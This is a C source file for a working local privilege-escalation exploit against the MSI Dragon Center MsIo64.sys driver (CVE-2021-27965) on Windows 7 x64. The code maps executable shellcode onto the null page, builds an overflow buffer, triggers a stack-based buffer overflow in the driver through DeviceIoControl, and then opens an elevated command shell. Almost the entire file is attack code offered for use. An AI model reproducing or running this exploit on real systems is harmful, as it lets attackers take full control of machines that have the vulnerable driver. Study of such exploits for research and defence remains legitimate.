#include "CVE-2021-27965.h"

int main(int argc, char** argv)
{
	printf("[>] Exploit written by uncodable (Start -> 7/29/2021 4:26 AM EST, End -> N/A)\n[>] Exploit -> MSI Dragon Center MsIo64.sys Stack-based Buffer Overflow Elevation of Privilege (Windows 7 x64)\n[>] Let's exploit!\n");

	if (check())
	{
		printf("[-] Exploit failed.");
		return 1;
	}

	if (setup())
	{
		printf("[-] Exploit failed.");
		return 1;
	}

	if (exploit())
	{
		printf("[-] Exploit failed.");
		return 1;
	}

	printf("[+] Exploit completed successfully!");
	unused = getchar();

	return 0;
}

int check()
{
	driver = CreateFileA("\\\\.\\MsIo", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (driver == (HANDLE)-1)
	{
		printf("[-] Unable to obtain a handle. Handle value: 0x%p, Error: %d (0x%x)", driver, GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("[+] Obtained a handle. Handle value: 0x%p\n", driver);

	return 0;
}

int setup()
{
	ntdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
	if (!ntdll)
	{
		printf("[-] Unable to load ntdll.dll. Handle value: 0x%p, Error: %d (0x%x)", ntdll, GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("[+] Loaded ntdll.dll. Handle value: 0x%p\n", ntdll);

	ZwAllocateVirtualMemory _ZwAllocateVirtualMemory = (ZwAllocateVirtualMemory)GetProcAddress(ntdll, "ZwAllocateVirtualMemory");
	if (!_ZwAllocateVirtualMemory)
	{
		printf("[-] Failed to locate ZwAllocateVirtualMemory. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("[+] Located ZwAllocateVirtualMemory. Address: 0x%p\n", _ZwAllocateVirtualMemory);

	PVOID baseAddress = (PVOID)1;
	SIZE_T regionSize = (SIZE_T)4096;
	NTSTATUS status = _ZwAllocateVirtualMemory(GetCurrentProcess(), &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (status)
	{
		printf("[-] Failed to map null page. NTSTATUS: %d (0x%x)", status, status);
		unused = getchar();
		return 1;
	}
	printf("[+] Mapped null page. NTSTATUS: %d (0x%x)\n", status, status);

	memset((void*)0x0, 0x90, 256);
	Sleep(250);
	memcpy((void*)0x0000000000000100, &shellcode, sizeof(shellcode));
	printf("[+] Mapped shellcode onto null page.\n");

	memset(inBuffer, 'A', 288);
	inBuffer[288] = 0x0;
	inBuffer[289] = 0x1;
	for (int i = 290; i < 296; i++)
	{
		inBuffer[i] = 0x0;
	}
	printf("[+] Crafted user-input buffer.\n");

	return 0;
}

int exploit()
{
	printf("[!] Triggering stack-based buffer overflow in three...");
	Sleep(1000);
	printf("\n[!] Two...");
	Sleep(1000);
	printf("\n[!] One...");
	Sleep(1000);
	printf("\n[!] Triggering...\n");
	Sleep(100);

	DeviceIoControl(driver, 0x80102054, &inBuffer, 296, &outBuffer, 1024, &bytesReturned, 0);
	Sleep(1000);
	system("start C:\\Windows\\System32\\cmd.exe");
	printf("[+] Spawned elevated shell.\n");

	return 0;
}
